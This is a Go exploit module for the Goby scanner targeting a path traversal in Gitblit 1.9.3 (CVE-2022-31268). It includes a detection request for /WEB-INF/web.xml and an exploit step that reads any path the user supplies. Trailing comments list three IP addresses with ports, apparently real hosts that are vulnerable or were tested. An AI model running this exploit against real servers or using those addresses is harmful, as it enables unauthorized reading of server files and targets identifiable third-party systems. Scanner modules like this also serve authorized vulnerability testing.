package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Gitblit 1.9.3 Path traversal (CVE-2022-31268)",
    "Description": "<p>Gitblit is an open source pure Java Git solution for Gitblit for managing, viewing and serving Git repositories.</p><p>Gitblit version 1.9.3 has a security vulnerability that stems from a path traversal issue. Attackers can use this vulnerability to read website files such as web.xml.</p>",
    "Product": "gitblit",
    "Homepage": "http://gitblit.github.io/gitblit/",
    "DisclosureDate": "2022-06-06",
    "Author": "abszse",
    "FofaQuery": "(title==\"Gitblit\" || body=\"<a title=\\\"gitblit homepage\\\" href=\\\"http://gitblit.com/\\\">\")",
    "GobyQuery": "(title==\"Gitblit\" || body=\"<a title=\\\"gitblit homepage\\\" href=\\\"http://gitblit.com/\\\">\")",
    "Level": "2",
    "Impact": "<p>Gitblit version 1.9.3 has a security vulnerability that stems from a path traversal issue. Attackers can use this vulnerability to read website files such as web.xml.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem, please pay attention to the official website in time: <a href=\"http://gitblit.github.io/gitblit/\">http://gitblit.github.io/gitblit/</a></p>",
    "References": [
        "https://github.com/metaStor/Vuls/blob/main/gitblit/gitblit%20V1.9.3%20path%20traversal/gitblit%20V1.9.3%20path%20traversal.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/resources//../WEB-INF/web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</web-app>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "java.sun.com",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/resources//..{{{filepath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2022-31268"
    ],
    "CNNVD": [
        "CNNVD-202205-3940"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Gitblit 1.9.3 路径遍历漏洞（CVE-2022-31268）",
            "Product": "gitblit",
            "Description": "<p>Gitblit是Gitblit的一个开源的纯 Java Git 解决方案，用于管理、查看和提供Git存储库。<br></p><p>Gitblit 1.9.3 版本存在安全漏洞，该漏洞源于路径遍历问题。攻击者利用该漏洞可以读取网站文件如web.xml等。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，请及时关注官网：<a href=\"http://gitblit.github.io/gitblit/\">http://gitblit.github.io/gitblit/</a><br></p>",
            "Impact": "<p>Gitblit 1.9.3 版本存在安全漏洞，该漏洞源于路径遍历问题。攻击者利用该漏洞可以读取网站文件如web.xml等。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Gitblit 1.9.3 Path traversal (CVE-2022-31268)",
            "Product": "gitblit",
            "Description": "<p>Gitblit is an open source pure Java Git solution for Gitblit for managing, viewing and serving Git repositories.<br></p><p>Gitblit version 1.9.3 has a security vulnerability that stems from a path traversal issue. Attackers can use this vulnerability to read website files such as web.xml.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem, please pay attention to the official website in time: <a href=\"http://gitblit.github.io/gitblit/\">http://gitblit.github.io/gitblit/</a><br></p>",
            "Impact": "<p>Gitblit version 1.9.3 has a security vulnerability that stems from a path traversal issue. Attackers can use this vulnerability to read website files such as web.xml.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
//http://47.106.199.123:9080
//http:/101.43.37.147:9876
//http://39.98.90.234:8010